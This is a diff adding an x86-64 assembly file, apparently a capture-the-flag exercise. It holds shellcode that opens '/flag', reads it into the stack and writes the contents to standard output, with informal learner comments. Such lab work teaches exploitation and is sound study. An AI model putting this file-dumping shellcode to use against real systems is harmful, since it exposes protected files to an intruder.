@@ -1,0 +1,29 @@
+.intel_syntax noprefix
+
+mov BYTE PTR [rsp], '/'
+mov BYTE PTR [rsp+1], 'f'
+mov BYTE PTR [rsp+2], 'l'           #hardcoded
+mov BYTE PTR [rsp+3], 'a'
+mov BYTE PTR [rsp+4], 'g'
+mov BYTE PTR [rsp+5], 0
+
+mov rax, 2              #syscall 2 for opeing the file
+mov rdi, rsp            #moving the buffer from rsp to rdi(first argument)            #opening the file{open("/flag",0)}
+mov rsi, 0              #second argument for open func 
+syscall                 
+
+mov rdi, rax            #setting the file descriptor received from kernel(3)(into rdi as after rax its first register in order)   
+mov rax, 0              #syscall setting in rax (zero for read)                                              #reading {read(fd,"flag",128)} 
+mov rsi, rsp            #setting second argument for the string we wrote earlier
+mov rdx, 128            #setting third argument for the max lenght
+syscall
+
+mov rdx, rax            #setting third argumnet (actual bytes that got read{n}) fro write func
+mov rax, 1              #syscall for writing                                          #write(1,"/flag",bytes_read)
+mov rdi, 1              #first argument pased for write func
+mov rsi, rsp            #setting name of file from stack 
+syscall 
+
+mov rax, 60             #exit sycall in rax
+mov rdi, 42             #exit code for pwn or something idk
+syscall
